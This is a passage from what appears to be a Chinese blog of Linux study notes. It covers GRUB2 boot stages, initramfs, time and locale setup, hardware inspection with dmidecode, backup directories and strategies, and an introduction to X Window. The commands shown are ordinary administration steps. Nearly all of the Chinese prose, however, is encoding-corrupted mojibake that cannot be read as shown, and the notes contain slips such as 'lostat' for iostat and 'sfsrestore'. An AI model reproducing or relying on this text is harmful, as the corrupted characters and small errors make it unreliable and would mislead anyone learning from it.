loader.</p><p>Linux å°† boot loader çš„ç¨‹åºä»£ç æ‰§è¡Œä¸è®¾ç½®å€¼åŠ è½½åˆ†æˆä¸¤ä¸ªé˜¶æ®µ (stage):</p><ul><li>Stage 1: æ‰§è¡Œ boot loader ä¸»ç¨‹åº, è¿™ä¸ªä¸»ç¨‹åºå¿…é¡»è¢«å®‰è£…åœ¨å¯åŠ¨åŒºï¼Œå³ MBR æˆ–å¯åŠ¨æ‰‡åŒº (boot sector)</li><li>Stage 2: ä¸»ç¨‹åºåŠ è½½é…ç½®æ–‡ä»¶ï¼Œé€šè¿‡ boot loader åŠ è½½æ‰€æœ‰é…ç½®æ–‡ä»¶ä¸ç›¸å…³çš„ç¯å¢ƒå‚æ•°æ–‡ä»¶, ä¸€èˆ¬æ¥è¯´ï¼Œé…ç½®æ–‡ä»¶éƒ½åœ¨ <code>/boot</code> ä¸‹<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ls -l <span class="hljs-regexp">/boot/g</span>rub2<br></code></pre></td></tr></table></figure></li></ul><h3 id="19-3-2-grub2-çš„é…ç½®æ–‡ä»¶-x2F-boot-x2F-grub2-x2F-grub-cfg-åˆæ¢"><a href="#19-3-2-grub2-çš„é…ç½®æ–‡ä»¶-x2F-boot-x2F-grub2-x2F-grub-cfg-åˆæ¢" class="headerlink" title="19.3.2 grub2 çš„é…ç½®æ–‡ä»¶ &#x2F;boot&#x2F;grub2&#x2F;grub.cfg åˆæ¢"></a>19.3.2 grub2 çš„é…ç½®æ–‡ä»¶ &#x2F;boot&#x2F;grub2&#x2F;grub.cfg åˆæ¢</h3><p>grub2 çš„ä¼˜ç‚¹:</p><ul><li>è¯†åˆ«ä¸æ”¯æŒè¾ƒå¤šæ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶ä¸”å¯ä»¥ä½¿ç”¨ grub2 çš„ä¸»ç¨‹åºç›´æ¥åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­æŸ¥æ‰¾å†…æ ¸æ–‡ä»¶</li><li>å¯åŠ¨æ—¶å¯ä»¥è‡ªè¡Œç¼–è¾‘ä¸ä¿®æ”¹å¯åŠ¨è®¾ç½®é€‰é¡¹ï¼Œç±»ä¼¼ bash çš„å‘½ä»¤æ¨¡å¼</li><li>å¯ä»¥åŠ¨æ€æŸ¥æ‰¾é…ç½®æ–‡ä»¶ï¼Œè€Œä¸éœ€è¦åœ¨ä¿®æ”¹é…ç½®æ–‡ä»¶åé‡æ–°å®‰è£… grub2</li></ul><h4 id="ç£ç›˜ä¸åˆ†åŒºåœ¨-grub2-ä¸­çš„ä»£å·"><a href="#ç£ç›˜ä¸åˆ†åŒºåœ¨-grub2-ä¸­çš„ä»£å·" class="headerlink" title="ç£ç›˜ä¸åˆ†åŒºåœ¨ grub2 ä¸­çš„ä»£å·"></a>ç£ç›˜ä¸åˆ†åŒºåœ¨ grub2 ä¸­çš„ä»£å·</h4><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">(hd0,1)</span>     <span class="hljs-attr"># ä¸€èˆ¬çš„é»˜è®¤è¯­æ³•ï¼Œç”± grub2</span> è‡ªåŠ¨åˆ¤æ–­åˆ†åŒºæ ¼å¼<br><span class="hljs-comment">(hd0,msdos1)</span>    <span class="hljs-attr"># æ­¤ç£ç›˜çš„åˆ†åŒºä¸ºä¼ ç»Ÿçš„ MBR æ¨¡å¼</span><br><span class="hljs-attr">(hd0</span>,gpt<span class="hljs-number">1</span>)      <span class="hljs-attr"># æ­¤ç£ç›˜çš„åˆ†åŒºä¸º GPT æ¨¡å¼</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„ç‚¹:</p><ul><li>ä»¥æŸ¥æ‰¾é¡ºåºä½œä¸ºç¡¬ç›˜çš„ç¼–å· </li><li>ç¬¬ä¸€ä¸ªæŸ¥æ‰¾åˆ°çš„ç¡¬ç›˜ä¸º 0 å·ï¼Œç¬¬äºŒä¸ªä¸º 1 å·</li><li>æ¯å¿«ç¡¬ç›˜çš„ç¬¬ä¸€ä¸ªåˆ†åŒºä»£å·ä¸º 1<br>ç”±äº BIOS å¯ä»¥è°ƒæ•´ç£ç›˜çš„å¯åŠ¨é¡ºåºï¼Œæ‰€ä»¥ <code>hdn</code> çš„ <code>n</code> ä¼šå˜.</li></ul><h3 id="19-3-3-grub2-é…ç½®æ–‡ä»¶ç»´æŠ¤-etc-default-grub-ä¸-etc-grub-d"><a href="#19-3-3-grub2-é…ç½®æ–‡ä»¶ç»´æŠ¤-etc-default-grub-ä¸-etc-grub-d" class="headerlink" title="19.3.3 grub2 é…ç½®æ–‡ä»¶ç»´æŠ¤ /etc/default/grub ä¸ /etc/grub.d"></a>19.3.3 grub2 é…ç½®æ–‡ä»¶ç»´æŠ¤ <code>/etc/default/grub</code> ä¸ <code>/etc/grub.d</code></h3><h3 id="19-3-4-instramfs-çš„é‡è¦æ€§ä¸å»ºç«‹æ–°-initramfs-æ–‡ä»¶"><a href="#19-3-4-instramfs-çš„é‡è¦æ€§ä¸å»ºç«‹æ–°-initramfs-æ–‡ä»¶" class="headerlink" title="19.3.4 instramfs çš„é‡è¦æ€§ä¸å»ºç«‹æ–° initramfs æ–‡ä»¶"></a>19.3.4 instramfs çš„é‡è¦æ€§ä¸å»ºç«‹æ–° initramfs æ–‡ä»¶</h3><p>initramfs å†…æ‰€åŒ…å«çš„æ¨¡å—å¤§å¤šæ˜¯ä¸å¯åŠ¨è¿‡ç¨‹æœ‰å…³ï¼Œè€Œä¸»è¦ä»¥æ–‡ä»¶ç³»ç»ŸåŠç¡¬ç›˜æ¨¡å—ä¸ºä¸».</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œéœ€è¦ initramfs çš„æ—¶åˆ»ä¸º:</p><ul><li>æ ¹ç›®å½•æ‰€åœ¨ç£ç›˜ä¸º SATA, USB æˆ– SCSI ç­‰æ¥å£è®¾å¤‡</li><li>æ ¹ç›®å½•æ‰€åœ¨æ–‡ä»¶ç³»ç»Ÿä¸º LVM, RAID ç­‰ç‰¹æ®Šæ ¼å¼</li><li>æ ¹ç›®å½•æ‰€åœ¨æ–‡ä»¶ç³»ç»Ÿä¸ºéä¼ ç»Ÿ Linux æ”¯æŒçš„æ–‡ä»¶ç³»ç»Ÿ</li><li>å…¶ä»–å¿…é¡»è¦å†…æ ¸åŠ è½½æ—¶æä¾›çš„æ¨¡å—</li></ul><h3 id="19-3-5-æµ‹è¯•ä¸å®‰è£…-grub2"><a href="#19-3-5-æµ‹è¯•ä¸å®‰è£…-grub2" class="headerlink" title="19.3.5 æµ‹è¯•ä¸å®‰è£… grub2"></a>19.3.5 æµ‹è¯•ä¸å®‰è£… grub2</h3><h3 id="19-3-6-å¯åŠ¨é’±çš„é¢å¤–åŠŸèƒ½ä¿®æ”¹"><a href="#19-3-6-å¯åŠ¨é’±çš„é¢å¤–åŠŸèƒ½ä¿®æ”¹" class="headerlink" title="19.3.6 å¯åŠ¨é’±çš„é¢å¤–åŠŸèƒ½ä¿®æ”¹"></a>19.3.6 å¯åŠ¨é’±çš„é¢å¤–åŠŸèƒ½ä¿®æ”¹</h3><p>é€‰é¡¹éƒ¨åˆ†çš„ç”»é¢å°±æ˜¯ menuentry åé¢çš„æ–‡å­—.</p><h3 id="19-3-7-å…³äºå¯åŠ¨ç”»é¢ä¸ç»ˆç«¯ç”»é¢çš„å›¾å½¢æ˜¾ç¤ºæ–¹å¼"><a href="#19-3-7-å…³äºå¯åŠ¨ç”»é¢ä¸ç»ˆç«¯ç”»é¢çš„å›¾å½¢æ˜¾ç¤ºæ–¹å¼" class="headerlink" title="19.3.7 å…³äºå¯åŠ¨ç”»é¢ä¸ç»ˆç«¯ç”»é¢çš„å›¾å½¢æ˜¾ç¤ºæ–¹å¼"></a>19.3.7 å…³äºå¯åŠ¨ç”»é¢ä¸ç»ˆç«¯ç”»é¢çš„å›¾å½¢æ˜¾ç¤ºæ–¹å¼</h3><h2 id="19-4-å¯åŠ¨è¿‡ç¨‹çš„é—®é¢˜è§£å†³"><a href="#19-4-å¯åŠ¨è¿‡ç¨‹çš„é—®é¢˜è§£å†³" class="headerlink" title="19.4 å¯åŠ¨è¿‡ç¨‹çš„é—®é¢˜è§£å†³"></a>19.4 å¯åŠ¨è¿‡ç¨‹çš„é—®é¢˜è§£å†³</h2><p>Linux æ— æ³•é¡ºåˆ©å¯åŠ¨æ—¶ï¼Œå¯è¿›å…¥ rescue æ¨¡å¼å»å¤„ç†.</p><h3 id="19-4-1-å¿˜è®°-root-å¯†ç çš„è§£å†³ä¹‹é“"><a href="#19-4-1-å¿˜è®°-root-å¯†ç çš„è§£å†³ä¹‹é“" class="headerlink" title="19.4.1 å¿˜è®° root å¯†ç çš„è§£å†³ä¹‹é“"></a>19.4.1 å¿˜è®° root å¯†ç çš„è§£å†³ä¹‹é“</h3><h3 id="19-4-2-ç›´æ¥å¯åŠ¨å°±ä»¥-root-æ‰§è¡Œ-bash-çš„æ–¹æ³•"><a href="#19-4-2-ç›´æ¥å¯åŠ¨å°±ä»¥-root-æ‰§è¡Œ-bash-çš„æ–¹æ³•" class="headerlink" title="19.4.2 ç›´æ¥å¯åŠ¨å°±ä»¥ root æ‰§è¡Œ bash çš„æ–¹æ³•"></a>19.4.2 ç›´æ¥å¯åŠ¨å°±ä»¥ root æ‰§è¡Œ bash çš„æ–¹æ³•</h3><h1 id="ç¬¬20ç« -åŸºç¡€ç³»ç»Ÿè®¾ç½®ä¸å¤‡ä»½ç­–ç•¥"><a href="#ç¬¬20ç« -åŸºç¡€ç³»ç»Ÿè®¾ç½®ä¸å¤‡ä»½ç­–ç•¥" class="headerlink" title="ç¬¬20ç«  åŸºç¡€ç³»ç»Ÿè®¾ç½®ä¸å¤‡ä»½ç­–ç•¥"></a>ç¬¬20ç«  åŸºç¡€ç³»ç»Ÿè®¾ç½®ä¸å¤‡ä»½ç­–ç•¥</h1><h2 id="20-1-ç³»ç»ŸåŸºæœ¬è®¾ç½®"><a href="#20-1-ç³»ç»ŸåŸºæœ¬è®¾ç½®" class="headerlink" title="20.1 ç³»ç»ŸåŸºæœ¬è®¾ç½®"></a>20.1 ç³»ç»ŸåŸºæœ¬è®¾ç½®</h2><p>ä½¿ç”¨ <code>hwclock</code> æ˜¯å°†æ­£ç¡®æ—¶é—´å†™å…¥ BIOS æ—¶é—´è®°å½•.</p><p>ä½¿ç”¨ <code>ntpdate</code> æ‰‹åŠ¨æ ¡æ—¶ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ntpdate s2m<span class="hljs-selector-class">.time</span><span class="hljs-selector-class">.edu</span>.cn<br></code></pre></td></tr></table></figure><p><code>s2m.time.edu.cn</code> æ˜¯åŒ—äº¬å¤§å­¦æä¾›çš„æ—¶é—´æœåŠ¡å™¨.</p><h3 id="20-1-3-è¯­ç³»è®¾ç½®"><a href="#20-1-3-è¯­ç³»è®¾ç½®" class="headerlink" title="20.1.3 è¯­ç³»è®¾ç½®"></a>20.1.3 è¯­ç³»è®¾ç½®</h3><p><code>/etc/locale.conf</code> æ˜¯è¯­ç³»çš„é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥ç”¨ <code>localectl</code> æ¥æŸ¥çœ‹ç›®å‰çš„ç³»ç»Ÿè¯­ç³»:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">localectl</span><br></code></pre></td></tr></table></figure><h3 id="20-1-4-é˜²ç«å¢™å»ºè®®è®¾ç½®"><a href="#20-1-4-é˜²ç«å¢™å»ºè®®è®¾ç½®" class="headerlink" title="20.1.4 é˜²ç«å¢™å»ºè®®è®¾ç½®"></a>20.1.4 é˜²ç«å¢™å»ºè®®è®¾ç½®</h3><p>é˜²ç«å¢™æ˜¯ä¸€ç§ç½‘ç»œæ•°æ®çš„è¿‡æ»¤æ–¹å¼ï¼Œå®ƒå¯ä»¥æ ¹æ®ä½ æœåŠ¡å™¨å¯åŠ¨çš„æœåŠ¡æ¥è®¾ç½®æ˜¯å¦å¼€æ”¾ï¼Œä¹Ÿèƒ½å¤Ÿé’ˆå¯¹å¯¹ä½ ä¿¡ä»»çš„ç”¨æˆ·å¼€æ”¾.</p><p>ç›¸å…³è®¾ç½®é¡¹ç›®:</p><ul><li>æœåŠ¡</li><li>ç«¯å£</li><li>å¯Œè§„åˆ™ (rich rule)</li><li>æ¥å£ : å°±æ˜¯è¿™ä¸ªåŒºåŸŸä¸»è¦æ˜¯é’ˆå¯¹é‚£ä¸€ä¸ªç½‘å¡æ¥åšè§„èŒƒ, å¦‚ eth0</li></ul><h2 id="20-2-æœåŠ¡å™¨ç¡¬ä»¶æ•°æ®çš„æ”¶é›†"><a href="#20-2-æœåŠ¡å™¨ç¡¬ä»¶æ•°æ®çš„æ”¶é›†" class="headerlink" title="20.2 æœåŠ¡å™¨ç¡¬ä»¶æ•°æ®çš„æ”¶é›†"></a>20.2 æœåŠ¡å™¨ç¡¬ä»¶æ•°æ®çš„æ”¶é›†</h2><h3 id="20-2-1-ä½¿ç”¨-dmidecode-æŸ¥çœ‹ç¡¬ä»¶è®¾å¤‡"><a href="#20-2-1-ä½¿ç”¨-dmidecode-æŸ¥çœ‹ç¡¬ä»¶è®¾å¤‡" class="headerlink" title="20.2.1 ä½¿ç”¨ dmidecode æŸ¥çœ‹ç¡¬ä»¶è®¾å¤‡"></a>20.2.1 ä½¿ç”¨ dmidecode æŸ¥çœ‹ç¡¬ä»¶è®¾å¤‡</h3><p>dmidecode å¯ç”¨äºæŸ¥çœ‹ CPU å‹å·ï¼Œä¸»æ¿å‹å·ä¸å†…å­˜ç›¸å…³çš„å‹å·ç­‰.</p><p>è¯­æ³•:</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">dmidecode</span> -t <span class="hljs-keyword">type</span><br></code></pre></td></tr></table></figure><p>é€‰é¡¹:</p><ul><li>1 : è¯¦ç»†çš„ç³»ç»Ÿä¿¡æ¯ï¼Œå«ä¸»æ¿çš„å‹å·ä¸ç¡¬ä»¶çš„åŸºç¡€ä¿¡æ¯ç­‰</li><li>4 : CPU çš„ç›¸å…³ä¿¡æ¯ï¼ŒåŒ…æ‹¬å€é¢‘ï¼Œå¤–é¢‘ï¼Œå†…æ ¸æ•°ï¼Œå†…æ ¸çº¿ç¨‹æ•°ç­‰</li><li>9 : ç³»ç»Ÿçš„ç›¸å…³æ’æ§½æ ¼å¼ï¼ŒåŒ…æ‹¬ PCI, PCI-E ç­‰çš„æ’æ§½è§„æ ¼è¯´æ˜</li><li>17 : æ¯ä¸€ä¸ªå†…å­˜æ’æ§½çš„è§„æ ¼ï¼Œè‹¥æœ‰å†…å­˜, åˆ™åˆ—å‡ºè¯¥å†…å­˜çš„å®¹é‡ä¸å‹å·</li></ul><h3 id="20-2-2-ç¡¬ä»¶èµ„æºçš„æ”¶é›†ä¸åˆ†æ"><a href="#20-2-2-ç¡¬ä»¶èµ„æºçš„æ”¶é›†ä¸åˆ†æ" class="headerlink" title="20.2.2 ç¡¬ä»¶èµ„æºçš„æ”¶é›†ä¸åˆ†æ"></a>20.2.2 ç¡¬ä»¶èµ„æºçš„æ”¶é›†ä¸åˆ†æ</h3><p>å†…æ ¸æ‰€æ£€æµ‹åˆ°çš„å„é¡¹ç¡¬ä»¶è®¾å¤‡ï¼Œä¼šè¢«è®°å½•åœ¨ <code>/proc</code> å’Œ <code>/sys</code> å½“ä¸­.</p><p><code>lspci</code>, <code>lsusb</code>, <code>iostat</code> å‘½ä»¤.</p><p><code>lspci</code> çš„æ‰€æœ‰æ•°æ®éƒ½æ˜¯ä» <code>/proc/bus/pci</code> ç›®å½•ä¸­è·å–ã€‚</p><p>åœ¨çº¿æ›´æ–°å¯¹åº”æ–‡ä»¶:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">update-pciids</span><br></code></pre></td></tr></table></figure><p><code>lostat</code> å¯ç”¨ <code>sudo pacman -S sysstat</code> æ¥å®‰è£….</p><h3 id="20-2-3-äº†è§£ç£ç›˜çš„å¥åº·çŠ¶æ€"><a href="#20-2-3-äº†è§£ç£ç›˜çš„å¥åº·çŠ¶æ€" class="headerlink" title="20.2.3 äº†è§£ç£ç›˜çš„å¥åº·çŠ¶æ€"></a>20.2.3 äº†è§£ç£ç›˜çš„å¥åº·çŠ¶æ€</h3><p>smartd æœåŠ¡, SMART æ˜¯ Self-Monitoring, Analysis and Reporting Technology System çš„ç¼©å†™.</p><p>éœ€è¦è¢«æ£€æµ‹çš„ç£ç›˜æ”¯æŒ SMART åè®®.</p><p>smartd æä¾›ä¸€ä¸ªå‘½ä»¤ <code>smartctl</code>.</p><h2 id="20-3-å¤‡ä»½è¦ç‚¹"><a href="#20-3-å¤‡ä»½è¦ç‚¹" class="headerlink" title="20.3 å¤‡ä»½è¦ç‚¹"></a>20.3 å¤‡ä»½è¦ç‚¹</h2><h3 id="20-3-1-å¤‡ä»½æ•°æ®çš„è€ƒè™‘"><a href="#20-3-1-å¤‡ä»½æ•°æ®çš„è€ƒè™‘" class="headerlink" title="20.3.1 å¤‡ä»½æ•°æ®çš„è€ƒè™‘"></a>20.3.1 å¤‡ä»½æ•°æ®çš„è€ƒè™‘</h3><h3 id="20-3-2-å“ªäº›-Linux-æ•°æ®å…·æœ‰å¤‡ä»½çš„æ„ä¹‰"><a href="#20-3-2-å“ªäº›-Linux-æ•°æ®å…·æœ‰å¤‡ä»½çš„æ„ä¹‰" class="headerlink" title="20.3.2 å“ªäº› Linux æ•°æ®å…·æœ‰å¤‡ä»½çš„æ„ä¹‰"></a>20.3.2 å“ªäº› Linux æ•°æ®å…·æœ‰å¤‡ä»½çš„æ„ä¹‰</h3><p>é€šå¸¸ç²—åˆ†ä¸ºä¸¤å¤§ç±»:</p><ul><li>ç³»ç»ŸåŸºæœ¬è®¾ç½®ä¿¡æ¯</li><li>ç±»ä¼¼ç½‘ç»œæœåŠ¡çš„å†…å®¹æ•°æ®</li></ul><h4 id="æ“ä½œç³»ç»Ÿæœ¬èº«éœ€è¦å¤‡ä»½çš„æ–‡ä»¶"><a href="#æ“ä½œç³»ç»Ÿæœ¬èº«éœ€è¦å¤‡ä»½çš„æ–‡ä»¶" class="headerlink" title="æ“ä½œç³»ç»Ÿæœ¬èº«éœ€è¦å¤‡ä»½çš„æ–‡ä»¶"></a>æ“ä½œç³»ç»Ÿæœ¬èº«éœ€è¦å¤‡ä»½çš„æ–‡ä»¶</h4><p>ä¸»è¦è·Ÿ <mark>å¸å·ä¸ç³»ç»Ÿé…ç½®æ–‡ä»¶</mark> æœ‰å…³, åŒ…æ‹¬ <code>/etc/passwd</code>, <code>/etc/shadow</code>, <code>/etc/group</code>, <code>/etc/gshadow</code> ä»¥åŠ <code>/home</code> ä¸‹çš„ç”¨æˆ·å®¶ç›®å½•ï¼Œä¸€èˆ¬å°† <code>/etc</code> ç›®å½•å¤‡ä»½ä¸‹æ¥ï¼Œå‡ ä¹æ‰€æœ‰çš„é…ç½®æ–‡ä»¶éƒ½å¯ä»¥è¢«ä¿å­˜.</p><p>ç”¨æˆ·çš„é‚®ä»¶ï¼Œ<code>/var/spool/mail</code> å†…å®¹ä¹Ÿéœ€è¦å¤‡ä»½.</p><ul><li><code>/etc/</code> æ•´ä¸ªç›®å½•</li><li><code>/home/</code> æ•´ä¸ªç›®å½•</li><li><code>/var/spool/mail/</code></li><li><code>/var/spool/&#123;at/cron&#125;/</code></li><li><code>/boot/</code></li><li><code>/root/</code></li><li><code>/usr/local/</code> æˆ– <code>/opt</code></li></ul><h4 id="ç½‘ç»œæœåŠ¡çš„æ•°æ®åº“æ–¹é¢"><a href="#ç½‘ç»œæœåŠ¡çš„æ•°æ®åº“æ–¹é¢" class="headerlink" title="ç½‘ç»œæœåŠ¡çš„æ•°æ®åº“æ–¹é¢"></a>ç½‘ç»œæœåŠ¡çš„æ•°æ®åº“æ–¹é¢</h4><ul><li>è½¯ä»¶æœ¬èº«çš„é…ç½®æ–‡ä»¶, å¦‚ <code>/etc/</code> æ•´ä¸ªç›®å½•ï¼Œ<code>/usr/local</code> æ•´ä¸ªç›®å½•</li><li>è½¯ä»¶æœåŠ¡æä¾›çš„æ•°æ®ï¼Œä»¥ WWW ä¸ºä¾‹: <code>/var/www</code> æ•´ä¸ªç›®å½•æˆ– <code>/srv/www</code> æ•´ä¸ªç›®å½•</li></ul><h4 id="æ¨èå¤‡ä»½çš„ç›®å½•"><a href="#æ¨èå¤‡ä»½çš„ç›®å½•" class="headerlink" title="æ¨èå¤‡ä»½çš„ç›®å½•"></a>æ¨èå¤‡ä»½çš„ç›®å½•</h4><ul><li><code>/etc/</code></li><li><code>/home/</code></li><li><code>/root/</code></li><li><code>/var/spool/mail/</code>, <code>/var/spool/cron/</code>, <code>/var/spool/at/</code></li><li><code>/var/lib/</code></li></ul><h4 id="ä¸éœ€è¦å¤‡ä»½çš„ç›®å½•"><a href="#ä¸éœ€è¦å¤‡ä»½çš„ç›®å½•" class="headerlink" title="ä¸éœ€è¦å¤‡ä»½çš„ç›®å½•"></a>ä¸éœ€è¦å¤‡ä»½çš„ç›®å½•</h4><ul><li>&#x2F;dev</li><li>&#x2F;proc, &#x2F;sys, &#x2F;run</li><li>&#x2F;mnt, &#x2F;media</li><li>&#x2F;tmp</li></ul><h2 id="20-4-å¤‡ä»½çš„ç§ç±»ï¼Œé¢‘ç‡ä¸å·¥å…·çš„é€‰æ‹©"><a href="#20-4-å¤‡ä»½çš„ç§ç±»ï¼Œé¢‘ç‡ä¸å·¥å…·çš„é€‰æ‹©" class="headerlink" title="20.4 å¤‡ä»½çš„ç§ç±»ï¼Œé¢‘ç‡ä¸å·¥å…·çš„é€‰æ‹©"></a>20.4 å¤‡ä»½çš„ç§ç±»ï¼Œé¢‘ç‡ä¸å·¥å…·çš„é€‰æ‹©</h2><h3 id="20-4-1-å®Œå¤‡å¤‡ä»½ä¹‹ç´¯ç§¯å¤‡ä»½-incremental-backup"><a href="#20-4-1-å®Œå¤‡å¤‡ä»½ä¹‹ç´¯ç§¯å¤‡ä»½-incremental-backup" class="headerlink" title="20.4.1 å®Œå¤‡å¤‡ä»½ä¹‹ç´¯ç§¯å¤‡ä»½ (incremental backup)"></a>20.4.1 å®Œå¤‡å¤‡ä»½ä¹‹ç´¯ç§¯å¤‡ä»½ (incremental backup)</h3><p>å³å°†æ ¹ç›®å½• (&#x2F;) æ•´ä¸ªç³»ç»Ÿéƒ½å¤‡ä»½ä¸‹æ¥.</p><p>ç´¯è®¡å¤‡ä»½æŒ‡åœ¨ç³»ç»Ÿè¿›è¡Œå®Œç¬¬ä¸€æ¬¡å®Œæ•´å¤‡ä»½åï¼Œç»è¿‡ä¸€æ®µæ—¶é—´çš„è¿è¡Œï¼Œæ¯”è¾ƒç³»ç»Ÿä¸å¤‡ä»½æ–‡ä»¶ä¹‹é—´çš„å·®å¼‚ï¼Œä»…å¤‡ä»½æœ‰å·®å¼‚çš„æ–‡ä»¶.</p><h4 id="ç´¯ç§¯å¤‡ä»½ä½¿ç”¨çš„å¤‡ä»½è½¯ä»¶"><a href="#ç´¯ç§¯å¤‡ä»½ä½¿ç”¨çš„å¤‡ä»½è½¯ä»¶" class="headerlink" title="ç´¯ç§¯å¤‡ä»½ä½¿ç”¨çš„å¤‡ä»½è½¯ä»¶"></a>ç´¯ç§¯å¤‡ä»½ä½¿ç”¨çš„å¤‡ä»½è½¯ä»¶</h4><p>å¸¸è§çš„æœ‰ dd, cpio, xfsdump&#x2F;sfsrestore ç­‰.</p><p>dd å¯ä»¥ç›´æ¥è¯»å–ç£ç›˜çš„æ‰‡åŒºè€Œä¸ç†ä¼šæ–‡ä»¶ç³»ç»Ÿï¼Œç¼ºç‚¹æ˜¯é€Ÿåº¦è¾ƒæ…¢. å…¶éœ€è¦ä½¿ç”¨é¢å¤–çš„è„šæœ¬ç¨‹åºå¤„ç†.</p><p>xfsdump å¯ç›´æ¥è¿›è¡Œç´¯ç§¯å¤‡ä»½</p><p>tar å‘½ä»¤ä¹Ÿå¯ç”¨äºå¤‡ä»½. å¸¸é…åˆ date å‘½ä»¤</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">tar -jpcvf mysql.`date +<span class="hljs-built_in">%Y</span>-<span class="hljs-built_in">%m</span>-<span class="hljs-built_in">%d</span>`.tar.bz2 /var/lib/mysql<br></code></pre></td></tr></table></figure><p>å¯å°†å¤‡ä»½ç”¨è„šæœ¬é…åˆ crontab å»æ‰§è¡Œ.</p><h3 id="20-4-2-å®Œæ•´å¤‡ä»½ä¹‹å·®å¼‚å¤‡ä»½-Differential-backup"><a href="#20-4-2-å®Œæ•´å¤‡ä»½ä¹‹å·®å¼‚å¤‡ä»½-Differential-backup" class="headerlink" title="20.4.2 å®Œæ•´å¤‡ä»½ä¹‹å·®å¼‚å¤‡ä»½ (Differential backup)"></a>20.4.2 å®Œæ•´å¤‡ä»½ä¹‹å·®å¼‚å¤‡ä»½ (Differential backup)</h3><h2 id="20-5-é¸Ÿå“¥çš„å¤‡ä»½ç­–ç•¥"><a href="#20-5-é¸Ÿå“¥çš„å¤‡ä»½ç­–ç•¥" class="headerlink" title="20.5 é¸Ÿå“¥çš„å¤‡ä»½ç­–ç•¥"></a>20.5 é¸Ÿå“¥çš„å¤‡ä»½ç­–ç•¥</h2><h1 id="ç¬¬23ç« -X-Window-è®¾ç½®ä»‹ç»"><a href="#ç¬¬23ç« -X-Window-è®¾ç½®ä»‹ç»" class="headerlink" title="ç¬¬23ç«  X Window è®¾ç½®ä»‹ç»"></a>ç¬¬23ç«  X Window è®¾ç½®ä»‹ç»</h1><p>Linux ä¸Šçš„å›¾å½¢ç”¨æˆ·ç•Œé¢æ¨¡å¼ç§°ä¸º X Window System. å…¶å¯¹äº Linux æ¥è¯´åªæ˜¯ä¸€ä¸ªè½¯ä»¶ã€‚</p><h2 id="23-1-ä»€ä¹ˆæ˜¯-X-Window-System"><a href="#23-1-ä»€ä¹ˆæ˜¯-X-Window-System" class="headerlink" title="23.1 ä»€ä¹ˆæ˜¯ X Window System"></a>23.1 ä»€ä¹ˆæ˜¯ X Window System</h2><p>åç§°ç”±æ¥, X åœ¨è‹±æ–‡é¡ºåºçš„ W(indow) åé¢ï¼Œæœ‰ä¸‹ä¸€ä»£çš„æ–°çª—å£ä¹‹æ„ã€‚å› æ­¤å«åš X Window System.</p><h3 id="23-1-1-X-Window-System-çš„å‘å±•ç®€å²"><a href="#23-1-1-X-Window-System-çš„å‘å±•ç®€å²" class="headerlink" title="23.1.1 X Window System çš„å‘å±•ç®€å²"></a>23.1.1 X Window System çš„å‘å±•ç®€å²</h3><p>åœ¨ UNIX-like ä¸Šé¢çš„å›¾å½¢ç”¨æˆ·æ¥å£(GUI)è¢«ç§°ä¸º X æˆ– X11.</p><h3 id="23-1-2-ä¸»è¦ç»„ä»¶-X-Server-x2F-X-Client-x2F-Window-Manager-Display-Manager"><a href="#23-1-2-ä¸»è¦ç»„ä»¶-X-Server-x2F-X-Client-x2F-Window-Manager-Display-Manager" class="headerlink" title="23.1.2 ä¸»è¦ç»„ä»¶: X Server&#x2F;X Client&#x2F;Window Manager?Display Manager"></a>23.1.2 ä¸»è¦ç»„ä»¶: X Server&#x2F;X Client&#x2F;Window Manager?Display Manager</h3><p>X Window System æ˜¯åŸºäºç½‘ç»œæ¶æ„çš„GUI. æ„æ€å°±æ˜¯ X Client ä»ç½‘ç»œä¸Šè·å–éœ€æ±‚ï¼ŒX Server æ¥å‘ˆç°(å³ç»˜åˆ¶å›¾åƒ)ã€‚éœ€è¦ç½‘ç»œæä¾›æ•°æ®ã€‚</p><p>åŸºæœ¬å¯ä»¥åˆ†æˆ X Server å’Œ X Client ä¸¤ä¸ªç»„ä»¶ã€‚</p><p>X Server ç®¡ç†ç¡¬ä»¶ï¼ŒX Client æ˜¯åº”ç”¨ç¨‹åºã€‚</p><p>å…·ä½“å†…å®¹:</p><ul><li>X Server, è´Ÿè´£ç¡¬ä»¶ç®¡ç†ã€å±å¹•ç»˜åˆ¶ä¸æä¾›å­—ä½“åŠŸèƒ½ã€‚å…¶ç®¡ç†çš„è®¾å¤‡åŒ…æ‹¬: é”®ç›˜ã€é¼ æ ‡ã€æ‰‹å†™æ¿ã€æ˜¾ç¤ºå™¨ã€å±å¹•åˆ†è¾¨ç‡ä¸è‰²å½©æ·±åº¦ã€æ˜¾å¡(åŒ…æ‹¬é©±åŠ¨ç¨‹åº)ä¸æ˜¾ç¤ºå­—ä½“ç­‰ã€‚<br>X Window System æ˜¯è½¯ä»¶ï¼Œæœ‰è‡ªå·±çš„é…ç½®æ–‡ä»¶ï¼Œå…¶è®¾ç½®ä¸ Linux ä¸ä¸€å®šç›¸åŒã€‚</li></ul><p>æ¯å°å®¢æˆ·ç«¯ä¸»æœºéƒ½éœ€è¦å®‰è£… X Server, è€ŒæœåŠ¡å™¨åˆ™æ˜¯æä¾› X Client è½¯ä»¶ï¼Œä»¥æä¾›å®¢æˆ·ç«¯ç»˜å›¾æ‰€éœ€è¦çš„æ•°æ®ã€‚</p><ul><li>X Client, è´Ÿè´£ X Server 